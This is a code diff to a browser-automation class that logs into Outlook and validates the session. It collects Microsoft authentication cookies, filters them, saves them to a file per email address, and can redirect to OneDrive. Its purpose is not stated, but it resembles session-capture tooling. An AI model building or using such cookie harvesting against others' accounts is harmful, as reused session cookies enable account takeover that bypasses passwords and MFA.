@@ -611,45 +611,35 @@ class OutlookLoginAutomation {
             if (isValidSession) {
                 console.log(`✅ Session validation successful for: ${email}`);
                 
-                // Immediately redirect to OneDrive without waiting for cookie save
-                this.redirectToOneDrive();
-                
-                // Save cookies for session persistence in background
-                setTimeout(async () => {
-                    try {
-                        const sessionFilePath = await this.saveCookies(email);
-                        console.log(`💾 Session cookies saved successfully: ${sessionFilePath}`);
-                    } catch (saveError) {
-                        console.error('Failed to save cookies:', saveError.message);
-                    }
-                }, 100);
+                // Save cookies first before any redirects
+                let sessionFilePath = null;
+                try {
+                    sessionFilePath = await this.saveCookies(email);
+                    console.log(`💾 Session cookies saved successfully: ${sessionFilePath}`);
+                } catch (saveError) {
+                    console.error('Failed to save cookies:', saveError.message);
+                }
                 
                 // Check inbox access
+                let hasInboxAccess = false;
                 try {
                     const inboxElements = await this.page.$$('[role="listbox"] [role="option"]');
+                    hasInboxAccess = inboxElements.length > 0;
                     console.log(`📧 Found ${inboxElements.length} emails in inbox - session fully active`);
-                    
-                    return {
-                        success: true,
-                        email: email,
-                        url: currentUrl,
-                        hasInboxAccess: inboxElements.length > 0,
-                        sessionId: Date.now().toString(),
-                        cookiesSaved: true,
-                        timestamp: new Date().toISOString()
-                    };
                 } catch (inboxError) {
                     console.warn('Inbox access check failed, but login appears successful');
-                    return {
-                        success: true,
-                        email: email,
-                        url: currentUrl,
-                        hasInboxAccess: false,
-                        sessionId: Date.now().toString(),
-                        cookiesSaved: true,
-                        timestamp: new Date().toISOString()
-                    };
                 }
+                
+                return {
+                    success: true,
+                    email: email,
+                    url: currentUrl,
+                    hasInboxAccess: hasInboxAccess,
+                    sessionId: Date.now().toString(),
+                    cookiesSaved: !!sessionFilePath,
+                    sessionFilePath: sessionFilePath,
+                    timestamp: new Date().toISOString()
+                };
             } else {
                 console.log(`❌ Session validation failed - not at Outlook interface`);
                 return {
@@ -674,7 +664,7 @@ class OutlookLoginAutomation {
 
     async redirectToOneDrive() {
         try {
-            console.log('🔄 Redirecting to OneDrive immediately...');
+            console.log('🔄 Redirecting to OneDrive...');
             await this.page.goto('https://onedrive.live.com', {
                 waitUntil: 'domcontentloaded',
                 timeout: 15000
@@ -708,20 +698,18 @@ class OutlookLoginAutomation {
             const currentCookies = await this.page.cookies();
             allCookies = allCookies.concat(currentCookies);
 
-            // Visit each Microsoft domain to collect all auth cookies
-            for (const domain of domains) {
-                try {
-                    console.log(`🌐 Collecting cookies from: ${domain}`);
-                    await this.page.goto(domain, {
-                        waitUntil: 'domcontentloaded',
-                        timeout: 8000
-                    });
-                    const domainCookies = await this.page.cookies();
-                    allCookies = allCookies.concat(domainCookies);
-                    console.log(`✅ Collected ${domainCookies.length} cookies from ${domain}`);
-                } catch (e) {
-                    console.log(`⚠️ Could not access ${domain}: ${e.message}`);
-                }
+            // Only collect cookies from current page and login.microsoftonline.com to avoid context issues
+            try {
+                console.log(`🌐 Collecting cookies from login.microsoftonline.com...`);
+                await this.page.goto('https://login.microsoftonline.com', {
+                    waitUntil: 'domcontentloaded',
+                    timeout: 8000
+                });
+                const loginCookies = await this.page.cookies();
+                allCookies = allCookies.concat(loginCookies);
+                console.log(`✅ Collected ${loginCookies.length} cookies from login.microsoftonline.com`);
+            } catch (e) {
+                console.log(`⚠️ Could not access login.microsoftonline.com: ${e.message}`);
             }
 
             // Filter for essential authentication cookies only
